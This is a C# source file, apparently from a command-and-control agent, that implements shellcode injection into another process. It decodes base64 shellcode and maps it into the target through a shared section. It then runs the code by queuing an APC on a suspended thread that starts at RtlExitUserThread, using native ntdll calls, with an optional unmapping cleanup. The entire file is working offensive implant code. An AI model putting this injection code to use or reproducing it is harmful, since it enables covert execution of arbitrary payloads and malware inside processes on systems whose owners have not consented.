using System;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;

using Agent.PInvoke;

namespace Agent.Injection
{
    internal class Bishop
    {
        internal static void Inject(string b64shellcode, int pid, bool cleanup)
        {
            var pv = BerlinDefence.ValidateProc(pid);
            if (!pv.isvalid) { return; }

            var scd = BerlinDefence.ReadShellcode(b64shellcode);

            // Create local section & map view of that section as RW in our process
            var localSection = BerlinDefence.MapLocalSection(scd.iSize);
            if (!localSection.isvalid) { return; }

            // Map section into remote process as RX
            var remoteSection = BerlinDefence.MapRemoteSection(pv.hProc, localSection.hSection, scd.iSize);
            if (!remoteSection.isvalid) { return; }

            // Write sc to local section
            Marshal.Copy(scd.bScData, 0, localSection.pBase, (int)scd.iSize);

            // Find remote thread start address offset from base -> RtlExitUserThread
            var pFucOffset = BerlinDefence.GetLocalExportOffset("ntdll.dll", "RtlExitUserThread");

            // Create suspended thread at RtlExitUserThread in remote process
            var hRemoteThread = IntPtr.Zero;
            var pRemoteStartAddress = (IntPtr)((Int64)pv.pNtllBase + (Int64)pFucOffset);
            var callResult = Win32.Ntdll.NtCreateThreadEx(ref hRemoteThread, 0x1FFFFF, IntPtr.Zero, pv.hProc, pRemoteStartAddress, IntPtr.Zero, true, 0, 0xffff, 0xffff, IntPtr.Zero);
            if (hRemoteThread == IntPtr.Zero) { return; }

            // Queue APC
            callResult = Win32.Ntdll.NtQueueApcThread(hRemoteThread, remoteSection.pBase, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (callResult != 0) { return; }

            // Resume thread
            uint SuspendCount = 0;
            callResult = Win32.Ntdll.NtAlertResumeThread(hRemoteThread, ref SuspendCount);
            if (callResult != 0) { return; }

            if (cleanup)
            {
                while (true)
                {
                    var ts = BerlinDefence.GetThreadState(hRemoteThread);
                    if (ts.ExitStatus != 259) // STILL_ACTIVE
                    {
                        Win32.Ntdll.NtUnmapViewOfSection(pv.hProc, remoteSection.pBase);
                        break;
                    }

                    Thread.Sleep(500);
                }
            }
        }
    }

    internal class BerlinDefence
    {
        internal static PROC_VALIDATION ValidateProc(int pid)
        {
            var pv = new PROC_VALIDATION();

            try
            {
                var process = Process.GetProcessById(pid);
                var processModules = process.Modules;
                foreach (ProcessModule module in processModules)
                {
                    if (module.FileName.EndsWith("ntdll.dll"))
                    {
                        pv.pNtllBase = module.BaseAddress;
                    }
                }
                pv.isvalid = true;
                pv.sName = process.ProcessName;
                pv.hProc = GetProcessHandle(pid);
                ulong isWow64 = 0;
                uint RetLen = 0;
                Win32.Ntdll.NtQueryInformationProcess(pv.hProc, 26, ref isWow64, Marshal.SizeOf(isWow64), ref RetLen);
                if (isWow64 == 0)
                    pv.isWow64 = false;
                else
                    pv.isWow64 = true;
            }
            catch
            {
                pv.isvalid = false;
            }

            return pv;
        }

        internal static IntPtr GetProcessHandle(int pid)
        {
            IntPtr hProc = IntPtr.Zero;
            var oa = new Win32.OBJECT_ATTRIBUTES();
            var ci = new Win32.CLIENT_ID();
            ci.UniqueProcess = (IntPtr)pid;
            Win32.Ntdll.NtOpenProcess(ref hProc, 0x1F0FFF, ref oa, ref ci);
            return hProc;
        }

        internal static SC_DATA ReadShellcode(string shellcode)
        {
            var scd = new SC_DATA();
            try
            {
                scd.bScData = Convert.FromBase64String(shellcode);
                scd.iSize = (uint)scd.bScData.Length;
            }
            catch { }

            return scd;
        }

        internal static SECT_DATA MapLocalSection(long scLen)
        {
            var sectionData = new SECT_DATA();

            var hSection = IntPtr.Zero;
            var callResult = Win32.Ntdll.NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref scLen, 0x40, 0x8000000, IntPtr.Zero);
            if (callResult == 0 && hSection != IntPtr.Zero)
            {
                sectionData.hSection = hSection;
            }
            else
            {
                sectionData.isvalid = false;
                return sectionData;
            }

            var pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            callResult = Win32.Ntdll.NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref scLen, 0x2, 0, 0x4);
            if (callResult == 0 && pScBase != IntPtr.Zero)
            {
                sectionData.pBase = pScBase;
            }
            else
            {
                sectionData.isvalid = false;
                return sectionData;
            }

            sectionData.isvalid = true;
            return sectionData;
        }

        internal static SECT_DATA MapRemoteSection(IntPtr hProc, IntPtr hSection, long ScSize)
        {
            var sectionData = new SECT_DATA();

            var pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            var callResult = Win32.Ntdll.NtMapViewOfSection(hSection, hProc, ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref ScSize, 0x2, 0, 0x20);
            if (callResult == 0 && pScBase != IntPtr.Zero)
            {
                sectionData.pBase = pScBase;
            }
            else
            {
                sectionData.isvalid = false;
                return sectionData;
            }

            sectionData.isvalid = true;
            return sectionData;
        }

        internal static IntPtr GetLocalExportOffset(string Module, string Export)
        {
            var uModuleName = new Win32.UNICODE_STRING();
            Win32.Ntdll.RtlInitUnicodeString(ref uModuleName, Module);
            var hModule = IntPtr.Zero;
            var callResult = Win32.Ntdll.LdrGetDllHandle(IntPtr.Zero, IntPtr.Zero, ref uModuleName, ref hModule);
            if (callResult != 0 || hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            var uFuncName = new Win32.UNICODE_STRING();
            Win32.Ntdll.RtlInitUnicodeString(ref uFuncName, Export);
            var aFuncName = new Win32.ANSI_STRING();
            Win32.Ntdll.RtlUnicodeStringToAnsiString(ref aFuncName, ref uFuncName, true);
            IntPtr pExport = IntPtr.Zero;
            callResult = Win32.Ntdll.LdrGetProcedureAddress(hModule, ref aFuncName, 0, ref pExport);

            if (callResult != 0 || pExport == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            var funcOffset = (IntPtr)((Int64)(pExport) - (Int64)(hModule));
            return funcOffset;
        }

        internal static Win32.THREAD_BASIC_INFORMATION GetThreadState(IntPtr hThread)
        {
            var ts = new Win32.THREAD_BASIC_INFORMATION();
            var buffPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ts));
            int retLen = 0;
            var callResult = Win32.Ntdll.NtQueryInformationThread(hThread, 0, buffPtr, Marshal.SizeOf(ts), ref retLen);
            if (callResult != 0) { return ts; }

            // Ptr to struct
            ts = (Win32.THREAD_BASIC_INFORMATION)Marshal.PtrToStructure(buffPtr, typeof(Win32.THREAD_BASIC_INFORMATION));
            return ts;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROC_VALIDATION
        {
            public Boolean isvalid;
            public String sName;
            public IntPtr hProc;
            public IntPtr pNtllBase;
            public Boolean isWow64;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct SC_DATA
        {
            public UInt32 iSize;
            public byte[] bScData;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }
    }
}